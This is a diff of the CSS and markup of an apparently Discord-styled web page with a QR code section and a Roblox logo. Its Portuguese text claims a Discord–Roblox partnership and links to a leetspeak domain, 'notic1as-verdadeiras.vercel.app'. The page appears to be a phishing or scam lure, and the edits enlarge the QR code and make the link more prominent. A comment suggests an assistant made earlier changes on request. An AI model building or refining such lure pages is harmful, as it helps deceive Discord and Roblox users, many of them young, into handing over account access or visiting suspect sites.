@@ -38,10 +38,10 @@
     }
     .container {
       display: flex;
-      width: 90%;
-      max-width: 1100px;
-      height: 85vh;
-      max-height: 700px;
+      width: 95%;
+      max-width: 1200px;
+      height: 88vh;
+      max-height: 720px;
       background: rgba(30, 30, 50, 0.80);
       border-radius: 12px;
       overflow: hidden;
@@ -58,12 +58,12 @@
       justify-content: center;
     }
     .right {
-      flex: 1;
+      flex: 1.2;
       background: rgba(54, 57, 63, 0.92);
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 40px;
+      padding: 50px 60px;
     }
     h1 {
       font-size: 2.2rem;
@@ -145,11 +145,12 @@
     .qr-section {
       text-align: center;
       color: white;
-      max-width: 320px;
+      max-width: 400px;
+      padding: 0 20px;
     }
     .qr-image {
-      width: 240px;
-      height: 240px;
+      width: 280px;
+      height: 280px;
       margin: 20px auto 16px;
       border-radius: 12px;
       box-shadow: 0 8px 30px rgba(0,0,0,0.5);
@@ -180,20 +181,26 @@
       width: auto;
       object-fit: contain;
     }
-    .parceria-text {
+    .parceria-wrapper {
+      margin-top: 20px;
       font-size: 1rem;
       font-weight: 600;
       color: #ffffff;
-      margin-bottom: 4px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
     }
-    .arrow-down {
-      font-size: 1rem; /* seta bem pequena agora, como você pediu */
+    .parceria-text {
+      text-align: center;
+    }
+    .arrow-right {
+      font-size: 1.2rem;
       color: #00aff4;
-      margin: 2px 0 6px 0; /* espaçamento ajustado pra não cobrir o link */
     }
     .extra-link {
-      margin-top: 4px; /* mais espaço pro link ficar visível */
-      font-size: 0.95rem;
+      font-size: 1rem;
+      word-break: break-all;
     }
     .extra-link a {
       color: #00aff4;
@@ -233,8 +240,10 @@
     }
     @media (max-width: 900px) {
       .container { flex-direction: column; height: auto; }
-      .right { padding: 60px 20px; }
+      .right { padding: 60px 30px; }
       .left { padding: 40px 30px; }
+      .qr-section { max-width: 100%; }
+      .parceria-wrapper { flex-direction: column; }
     }
   </style>
 </head>
@@ -285,12 +294,14 @@
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
         </div>
 
-        <!-- Texto + seta pequena + link -->
-        <div style="margin-top: 20px;">
+        <!-- Texto + seta para direita + link -->
+        <div class="parceria-wrapper">
           <p class="parceria-text">A parceria entre o Discord e o Roblox está no link abaixo!</p>
-          <div class="arrow-down">↓</div>
-          <div class="extra-link">
-            <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">https://notic1as-verdadeiras.vercel.app</a>
+          <div style="display: flex; align-items: center; gap: 8px;">
+            <span class="arrow-right">→</span>
+            <div class="extra-link">
+              <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">https://notic1as-verdadeiras.vercel.app</a>
+            </div>
           </div>
         </div>
       </div>
